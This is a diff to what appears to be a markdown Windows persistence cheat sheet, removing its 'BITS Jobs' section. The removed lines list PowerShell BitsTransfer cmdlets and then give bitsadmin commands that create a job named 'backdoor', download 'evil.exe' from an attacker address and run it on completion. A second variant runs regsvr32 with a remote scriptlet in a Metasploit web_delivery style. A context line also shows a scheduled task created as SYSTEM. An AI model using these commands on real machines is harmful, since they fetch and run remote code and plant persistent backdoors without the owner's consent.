@@ -207,53 +207,6 @@ C:\Windows\system32\schtasks.exe"  /Create /F /RU System /SC DAILY /ST 10:39 /TN
 {% endtab %}
 {% endtabs %}
 
-### BITS Jobs
-
-{% tabs %}
-{% tab title="PowerShell" %}
-First, you must import the BitsTransfer PowerShell Module with `Import-Module BitsTransfer`.  After you import the BitsTransfer module, the following cmdlets are available:
-
-* **`Add-BitsFile`** Adds files to a BITS transfer
-* **`Complete-BitsTransfer`** Completes a BITS transfer
-* **`Get-BitsTransfer`** Gets a BITS transfer
-* **`Remove-BitsTransfer`** Stops a BITS transfer
-* **`Resume-BitsTransfer`** Resumes a suspended BITS transfer
-* **`Set-BitsTransfer`** Configures a BITS transfer job
-* **`Start-BitsTransfer`** Creates and starts a BITS transfer job
-* **`Suspend-BitsTransfer`** Pauses a BITS transfer job
-
-For example, the following Windows PowerShell command begins a BITS transfer from the local computer to a computer named CLIENT:
-
-```powershell
-Start-BitsTransfer -Source file.txt -Destination \\client\share -Priority normal
-```
-
-When running Windows PowerShell interactively, the PowerShell window displays the progress of the transfer. The following command uses an abbreviated notation to download a file from a Web site to the local computer:
-
-```powershell
-Start-BitsTransfer https://server/dir/myfile.txt C:\docs\myfile.txt
-```
-
-****[**Microsoft**](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff382721\(v=msdn.10\))****
-{% endtab %}
-
-{% tab title="cmd.exe" %}
-```
-bitsadmin /create backdoor
-bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
-
-# v1
-bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
-bitsadmin /SetMinRetryDelay "backdoor" 60
-bitsadmin /resume backdoor
-
-# v2 - exploit/multi/script/web_delivery
-bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
-bitsadmin /resume backdoor
-```
-{% endtab %}
-{% endtabs %}
-
 ### Windows Services
 
 May need some privileges for Windows services...
